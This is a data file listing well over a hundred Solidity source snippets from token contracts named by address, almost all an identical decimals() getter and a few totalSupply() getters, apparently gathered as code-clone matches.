<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="59" endline="61" pcid="6867">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="65" endline="67" pcid="6923">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="58" endline="60" pcid="4044">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="59" endline="61" pcid="1546">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="60" endline="62" pcid="3710">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="55" endline="57" pcid="2231">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="62" endline="64" pcid="2974">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="62" endline="64" pcid="6641">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="61" endline="63" pcid="305">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="63" endline="65" pcid="446">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x57ff7796c8fc9ea293a1e63e405066342f87454d.sol" startline="31" endline="33" pcid="3296">
    function totalSupply() public override view returns (uint256) {
        return totalSupply_;
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="59" endline="61" pcid="1159">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="67" endline="69" pcid="5847">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="62" endline="64" pcid="6838">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="59" endline="61" pcid="2748">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="61" endline="63" pcid="5513">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="62" endline="64" pcid="4415">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="60" endline="62" pcid="546">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="62" endline="64" pcid="6212">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="62" endline="64" pcid="1844">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="60" endline="62" pcid="713">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="62" endline="64" pcid="7440">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="58" endline="60" pcid="8242">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="60" endline="62" pcid="3647">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="678" endline="680" pcid="6823">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="63" endline="65" pcid="7232">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="63" endline="65" pcid="8407">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="131" endline="133" pcid="3158">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="57" endline="59" pcid="2508">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="63" endline="65" pcid="2246">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="58" endline="60" pcid="4825">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="62" endline="64" pcid="7538">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="58" endline="60" pcid="6579">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="58" endline="60" pcid="6117">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="65" endline="67" pcid="8166">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="60" endline="62" pcid="6332">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="62" endline="64" pcid="2624">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="60" endline="62" pcid="64">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="59" endline="61" pcid="6683">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="59" endline="61" pcid="7696">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="60" endline="62" pcid="5573">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="61" endline="63" pcid="3071">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="62" endline="64" pcid="3439">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="59" endline="61" pcid="4870">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="62" endline="64" pcid="9359">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="62" endline="64" pcid="9344">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="58" endline="60" pcid="5717">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="58" endline="60" pcid="2342">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="59" endline="61" pcid="8832">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="133" endline="135" pcid="3738">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="63" endline="65" pcid="7858">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="58" endline="60" pcid="6746">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="62" endline="64" pcid="3424">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="59" endline="61" pcid="2372">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="58" endline="60" pcid="7309">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="60" endline="62" pcid="5627">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="61" endline="63" pcid="9329">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="62" endline="64" pcid="5144">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="58" endline="60" pcid="358">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="58" endline="60" pcid="8017">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="60" endline="62" pcid="3004">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="59" endline="61" pcid="8257">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="60" endline="62" pcid="516">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="63" endline="65" pcid="2402">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="57" endline="59" pcid="3787">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="59" endline="61" pcid="2357">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="62" endline="64" pcid="4223">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="58" endline="60" pcid="8810">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="62" endline="64" pcid="3484">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="61" endline="63" pcid="5316">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="133" endline="135" pcid="4166">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="59" endline="61" pcid="4385">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="62" endline="64" pcid="1398">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="62" endline="64" pcid="1368">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="57" endline="59" pcid="2145">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="57" endline="59" pcid="8612">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="58" endline="60" pcid="5762">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="61" endline="63" pcid="225">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="64" endline="66" pcid="2572">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="61" endline="63" pcid="7470">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="59" endline="61" pcid="5528">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="386" endline="388" pcid="9311">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="62" endline="64" pcid="2835">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="59" endline="61" pcid="3221">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="59" endline="61" pcid="9056">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="61" endline="63" pcid="7187">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="59" endline="61" pcid="5015">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="60" endline="62" pcid="3547">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="60" endline="62" pcid="2940">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="60" endline="62" pcid="5353">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="60" endline="62" pcid="3307">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="59" endline="61" pcid="6938">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="58" endline="60" pcid="8482">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="60" endline="62" pcid="6148">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="64" endline="66" pcid="8287">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x512Fe2B277Bd0EB9763a329f1025dc6cBcBf225B.sol" startline="38" endline="40" pcid="3014">
    function totalSupply() public override view returns (uint256) {
    return totalSupply_;
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="63" endline="65" pcid="4238">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="57" endline="59" pcid="7741">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="55" endline="57" pcid="973">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="59" endline="61" pcid="1129">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="62" endline="64" pcid="4673">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="58" endline="60" pcid="7817">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="61" endline="63" pcid="5908">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="57" endline="59" pcid="4029">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="58" endline="60" pcid="924">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="62" endline="64" pcid="817">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="41" endline="43" pcid="8055">
  function totalSupply() public view override returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="56" endline="58" pcid="5000">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="62" endline="64" pcid="2733">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="70" endline="72" pcid="8958">
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="63" endline="65" pcid="4345">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="59" endline="61" pcid="8377">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="59" endline="61" pcid="662">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="59" endline="61" pcid="5169">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="59" endline="61" pcid="3286">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="386" endline="388" pcid="3025">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="59" endline="61" pcid="7263">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="60" endline="62" pcid="6424">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="42" endline="44" pcid="3849">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="59" endline="61" pcid="3146">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="62" endline="64" pcid="3086">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="58" endline="60" pcid="9205">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="64" endline="66" pcid="4589">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="61" endline="63" pcid="8795">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="59" endline="61" pcid="5075">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="62" endline="64" pcid="1109">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="60" endline="62" pcid="2799">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="59" endline="61" pcid="6377">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="57" endline="59" pcid="9290">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="62" endline="64" pcid="1383">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="58" endline="60" pcid="5747">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="60" endline="62" pcid="7278">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="62" endline="64" pcid="3867">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="58" endline="60" pcid="1307">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="59" endline="61" pcid="832">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="62" endline="64" pcid="1639">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="57" endline="59" pcid="8002">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="65" endline="67" pcid="1665">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="59" endline="61" pcid="275">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="58" endline="60" pcid="5199">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="59" endline="61" pcid="2063">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="61" endline="63" pcid="2850">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="61" endline="63" pcid="771">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="58" endline="60" pcid="7649">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="62" endline="64" pcid="4704">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="62" endline="64" pcid="4643">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="56" endline="58" pcid="5030">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5f60596411116de6c38ac8d68c159700cf72db3f.sol" startline="30" endline="32" pcid="3605">
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="62" endline="64" pcid="1196">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="64" endline="66" pcid="6197">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
